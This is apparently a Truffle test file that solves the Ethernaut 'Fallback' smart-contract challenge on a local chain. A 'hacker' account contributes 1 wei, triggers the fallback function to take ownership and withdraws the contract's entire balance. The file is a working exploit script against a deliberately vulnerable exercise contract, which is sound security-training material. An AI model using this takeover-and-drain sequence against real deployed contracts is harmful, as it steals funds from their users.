'use strict'

const utils = require('./common/utils');
const {assert, expect} = require('chai');
const Fallback = artifacts.require("Fallback");

contract('Fallback', async (accounts) => {
    
    let fallback;
    
    const victim = accounts[1];
    const hacker = accounts[2];
    
    beforeEach( async () => {

        fallback = await Fallback.new({
            from: victim
        });
        expect(await fallback.owner()).to.equal(victim);

        let balance = await fallback.getContribution({from: victim});
        expect(balance.toNumber()).to.equal(1e+21);
    });

    it("Owner should be changed to attacker", async () => {

        await fallback.contribute({
            from: hacker,
            value: 1
        })
        let balance = await fallback.contributions(hacker);
        expect(balance.toNumber())
        .to.equal(1, "hacker balance is registered as 1 wei.");

        await web3.eth.sendTransaction({
            from: hacker,
            to: fallback.address,
            value: 1
        });
        expect(await fallback.owner())
        .to.equal(hacker, "hacker should become the new owner.");
        
        await fallback.withdraw({from: hacker});
      
        assert.equal(
            await web3.eth.getBalance(fallback.address),
            web3.toWei(0, 'wei'),
            "Victim contract should have zero balance"
        );
    });
});